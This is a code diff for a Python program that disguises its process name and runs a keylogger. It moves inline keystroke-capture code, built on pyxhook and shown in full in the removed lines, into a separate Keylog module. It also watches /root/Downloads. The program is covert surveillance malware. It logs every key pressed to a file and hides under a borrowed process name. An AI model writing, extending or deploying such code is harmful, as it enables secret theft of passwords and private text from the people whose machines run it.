@@ -1,11 +1,10 @@
 import subprocess
 import setproctitle
 import psutil
-import os
-import pyxhook
 
 
 from watch import Watch
+from keylog import Keylog
 
 
 def get_best_process_name():
@@ -26,29 +25,6 @@ def get_best_process_name():
     return best_process_name
 
 
-def start_keylogger():
-    def OnKeyPress(event):
-        with open(log_file, 'a') as f:
-            if event.Key == "Return":
-                event.Key = "\n"
-            f.write('{}'.format(event.Key))
-
-    new_hook.KeyDown = OnKeyPress
-    new_hook.HookKeyboard()
-    try:
-        new_hook.start()
-    except KeyboardInterrupt:
-        pass
-    except Exception as ex:
-        msg = 'Error while catching events:\n  {}'.format(ex)
-        with open(log_file, 'a') as f:
-            f.write('\n{}'.format(msg))
-
-
-def stop_keylogger():
-    new_hook.cancel()
-
-
 def run_command(command):
     try:
         data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -59,11 +35,10 @@ def run_command(command):
 
 
 if __name__ == '__main__':
-    log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
-    new_hook = pyxhook.HookManager()
     setproctitle.setproctitle(get_best_process_name())
-    start_keylogger()
-    stop_keylogger()
+    key_logger = Keylog()
+    key_logger.start_keylogger()
+    key_logger.stop_keylogger()
     watch = Watch()
     watch.add_watched("/root/Downloads", True)
     watch.start()
